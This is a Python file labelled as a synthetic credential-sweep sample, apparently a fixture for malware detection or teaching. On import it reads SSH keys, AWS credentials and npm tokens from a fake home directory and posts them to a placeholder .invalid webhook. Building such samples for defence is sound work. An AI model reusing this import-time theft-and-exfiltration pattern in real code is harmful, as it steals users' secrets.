"""Synthetic credential-sweep sample. Never install or import this package.

All paths point at a fake home directory, and the endpoint uses a reserved
.invalid domain, so importing it cannot read or send anything real.
"""
import requests

HOME = "/home/demo-user"  # synthetic path: no real credentials live here


def collect() -> dict[str, str]:
    return {
        "ssh_rsa": open(f"{HOME}/.ssh/id_rsa", encoding="utf-8").read(),
        "ssh_ed25519": open(f"{HOME}/.ssh/id_ed25519", encoding="utf-8").read(),
        "aws": open(f"{HOME}/.aws/credentials", encoding="utf-8").read(),
        "npm": open(f"{HOME}/.npmrc", encoding="utf-8").read(),
    }


requests.post(
    "https://webhook.example.invalid/collect",
    json=collect(),
    timeout=5,
)
